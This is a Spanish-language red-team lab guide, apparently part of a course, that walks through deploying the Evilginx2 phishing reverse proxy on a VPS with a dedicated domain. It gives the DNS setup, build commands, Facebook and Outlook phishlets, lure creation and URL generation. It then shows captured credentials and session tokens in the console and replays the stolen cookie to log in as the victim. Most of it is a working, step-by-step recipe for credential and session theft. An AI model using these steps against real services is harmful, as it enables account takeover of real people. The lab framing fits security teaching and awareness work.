# Laboratorio de Phishing

### VPS

> Para este laboratorio, configuré un **Droplet** (*VPS*) de *Digital Ocean* con Ubuntu y el **nombre de dominio** `calcifer.lat`.

Es importante configurar correctamente el registro *DNS* **A** de nuestro dominio al *VPS*, y el registro **CNAME** de cualquier dominio (`*`) a el dominio principal, en este caso `calcifer.lat`.

| Tipo      | Host | Valor          |
| --------- | ---- | -------------- |
| **A**     | `@`  | `<IP>`         |
| **CNAME** | `*`  | `calcifer.lat` |

### Configuración de  *Evilginx*

##### Instalación

<p  align="center">
  <img  width="200"  src="https://cdn.cyberpunk.rs/wp-content/uploads/2018/10/evilginx_phishing_bg.jpg"  alt="">
</p>

Primero, debemos asegurarnos de tener instalado el lenguaje **Golang** en el *VPS*, además de su compilador `go`.
De modo que ejecutamos:

```bash
sudo apt install golang-go
```

Ya que contemos con el compilador, en algun espacio de trabajo clonamos el repositorio oficial de **Evilginx**:

```bash
git clone https://github.com/kgretzky/evilginx2.git
```

Despues, dentro de la carpeta que acabamos de clonar, compilamos el código fuente para generar un ejecutable `evilginx2`. Esto con la instrucción:

```bash
go build
```

Opcionalmente, se podría configurar un *script* `/usr/local/bin/evilginx2`  con siguiente contenido para poder ejecutar `evilginx2` desde cualquier ruta:

```bash
#!/bin/bash
(cd /usr/share/evilginx2 && ./evilginx2 "$@")
```

Así, podemos iniciar `evilginx2` para que genere los archivos de configuración necesarios y debería verse algo similar a:

![redteam_phishingevilginx.png](imagenes/redteam_phishingevilginx.png)

El error al iniciar el **nameserver** es típico y se soluciona editando el archivo `/etc/systemd/resolved.conf`, particularmente fijando las siguientes opciones de la sección `[Resolve]`:

- `DNS=1.1.1.1`
- `FallbackDNS=8.8.8.8`
- `DNSStubListener=no`

Después, creamos un enlace simbólico necesario con el siguiente comando:

```bash
sudo ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
```

Y después de reiniciar el **VPS**, ya no debería salir esta advertencia.

##### Phishlets y lures

Para este laboratorio, se utilizaron **Phishlets** del repositorio [Evilginx2-Phishlets](https://github.com/An0nUD4Y/Evilginx2-Phishlets), particularmente `facebook.yaml` y `outlook.yaml`.
Es necesario descargarlos y ubicarlos en la ubicación del directorio `evilginx2` que clonamos, en la carpeta `phishlets`.

Una vez descargados, deberían reflejarse en la intefaz de `evilginx2` al iniciarlo:

![redteam_phishlets_loaded.png](imagenes/redteam_phishlets_loaded.png)

Antes de activarlos, primero debemos designarles un **subdominio** de nuestro dominio principal `calcifer.lat`.
Se recomienda un nombre genérico, pues muchos `phishlets` agregan subdominios por su cuenta, pero relacionado al sitio objetivo.
Para **Facebook** seleccioné el subdominio `meta.calcifer.lat` y se asigna con el siguiente comando dentro de la interfaz:

```evilginx2
# phishlets hostname <nombre> <subdominio>

phishlets hostname facebook meta.calcifer.lat
```

Después, se activa el phishlet y **Evilginx** automáticamente generará los certificados *TLS/SSL* necesarios.

![redteam_phishlets_enable.png](imagenes/redteam_phishlets_enable.png)

Finalmente, se debe crear un **lure**, el enlace malicioso que entregaremos como **carga útil**, con la instrucción:

```evilginx2
# lures create <nombre_phishlet>

lures create facebook
```

Y generar la **URL** correspondiente, en base al **ID** asignado al nuevo **lure**, en este caso 0, con:

```evilginx2
# lures get-url <id>

lures get-url 0
```

Esto nos brinda una **URL** de un recurso malicioso dentro del subdominio indicado previamente, por ejemplo `https://www.meta.calcifer.lat/ycWnmuCs`, que detonará la funcionalidad maliciosa de **proxy inverso** sobre el *login* de *Facebook*.

##### Captura de sesión

Obviando por el momento los mecanismos de entrega, cuando la **victima** acceda al enlace, lo recibirá un **login** auténtico de *Facebook*:

![redteam_facebook_proxyied.png](imagenes/redteam_facebook_proxyied.png)

Una vez que este inicie sesión con sus credenciales, **Evilginx** capturará las credenciales y la **Cookie** de sesión devuelta por el sitio legítimo, **Facebook** en este caso.

```txt
[17:56:59] [+++] [2] Username: [rooteda8@gmail.com]
[17:56:59] [+++] [2] Password: [<--Redacted-->]
[17:57:01] [+++] [2] all authorization tokens intercepted!
```

Podemos visualizar todas las sesiones capturadas con el comando `sessions`, e inspeccionar detalles y el **token** capturado de una en particular especificando el **id** de la sesión, de la forma `sessions <id>`.

![redteam_facebookSession_captured.png](imagenes/redteam_facebookSession_captured.png)

Ahora, como **atacantes**, podemos utilizar esta **cookie** capturada para autenticarnos en el sitio legítimo `www.facebook.com`, **importandola** con alguna extensión compatible como [Cookie editor](https://cookie-editor.com/).

![redteam_cookie_editor.png](imagenes/redteam_cookie_editor.png)

Una vez **importada**, al recargar la página deberíamos estar *logeados* como el usuario capturado:

![redteam_logged_facebook.png](imagenes/redteam_logged_facebook.png)

# Enlaces

[<- Fundamentos del Phishing](RedTeam_PhishingTeoria.md) |